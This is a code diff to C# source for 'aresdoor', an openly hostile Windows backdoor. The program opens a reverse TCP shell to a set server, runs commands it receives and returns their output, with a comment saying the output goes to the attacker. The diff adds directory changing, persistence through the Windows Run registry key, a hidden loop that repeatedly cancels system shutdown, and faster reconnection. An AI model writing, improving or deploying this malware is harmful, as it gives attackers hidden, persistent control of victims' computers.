@@ -10,6 +10,7 @@ namespace aresdoor
         // Modify these variables as needed.
         private static string server = "localhost";
         private static int port = 9000;
+        private static bool prevent_shutdown = false;
 
         private static string exec(string cmd)
         {
@@ -36,47 +37,54 @@ namespace aresdoor
             }
         }
 
+        private static byte[] byteCode(string contents)
+        {
+            return System.Text.Encoding.ASCII.GetBytes(contents);
+        }
+
         private static void sendBackdoor(string server, int port)
         {
             try
             {
                 System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, port);
                 System.Net.Sockets.NetworkStream stream = client.GetStream();
-
+                string responseData;
+               
                 while (true)
                 {
-                    // Send the message to the connected TcpServer. 
-                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
+                    byte[] shellcode = byteCode(System.IO.Directory.GetCurrentDirectory() + "> ");
 
-                    // Buffer to store the response bytes.
-                    byte[] data = new byte[256];
+                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
+                    byte[] data = new byte[256]; byte[] output = byteCode("");
 
                     // String to store the response ASCII representation.
-                    string responseData = "";
-
-                    // Read the first batch of the TcpServer response bytes.
+                    
                     int bytes = stream.Read(data, 0, data.Length);
                     responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
 
-                    if (responseData == "exit")
+                    if (responseData.Contains("cd"))
                     {
-                        break;
+                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
+                    }
+                    else if (responseData.Contains("setStartup"))
+                    {
+                        SetStartup();
+                        output = byteCode("Application added to startup registry.\n");
                     }
                     else
                     {
-                        byte[] output;
-                        try { output = System.Text.Encoding.ASCII.GetBytes(exec(responseData)); } catch (Exception) { output = System.Text.Encoding.ASCII.GetBytes("Command couldn't execute."); }
+                        try { output = byteCode(exec(responseData)); } catch (Exception) { output = byteCode("Command couldn't execute."); }
+                    }
 
-                        try
-                        {
-                            stream.Write(output, 0, output.Length); // Send output of command back to attacker.
-                        }
-                        catch (System.IO.IOException)
-                        {
-                            stream.Close();
-                            client.Close();
-                            break;
-                        }
+                    try
+                    {
+                        stream.Write(output, 0, output.Length); // Send output of command back to attacker.
+                    }
+                    catch (System.IO.IOException)
+                    {
+                        stream.Close();
+                        client.Close();
+                        break;
                     }
                 }
 
@@ -93,7 +101,7 @@ namespace aresdoor
                 ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
             string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            rk.SetValue("aresdoor", currfile);
+            rk.SetValue(System.IO.Path.GetFileName(currfile), currfile);
         }
 
         static void Main(string[] args)
@@ -113,8 +121,27 @@ namespace aresdoor
                 server = args[0];
                 port = Int32.Parse(args[1]);
             }
+            
+            if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ToString()).Length != 0)
+            { System.Environment.Exit(0); }
 
-            SetStartup();
+            if (prevent_shutdown == true)
+            {
+                new System.Threading.Thread(() =>
+                {
+                    System.Threading.Thread.CurrentThread.IsBackground = true;
+                    while (true)
+                    {
+                        System.Diagnostics.Process process = new System.Diagnostics.Process();
+                        process.StartInfo.FileName = "shutdown.exe";
+                        process.StartInfo.Arguments = "-a";
+                        process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                        process.Start();
+                        process.WaitForExit();
+                        System.Threading.Thread.Sleep(2000);
+                    }
+                }).Start();
+            }
 
             while (true)
             {
@@ -128,7 +155,7 @@ namespace aresdoor
                     catch (Exception)
                     { } // pass silently
                 }
-                System.Threading.Thread.Sleep(10000); // sleep for 10 seconds before retrying
+                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
         }
 
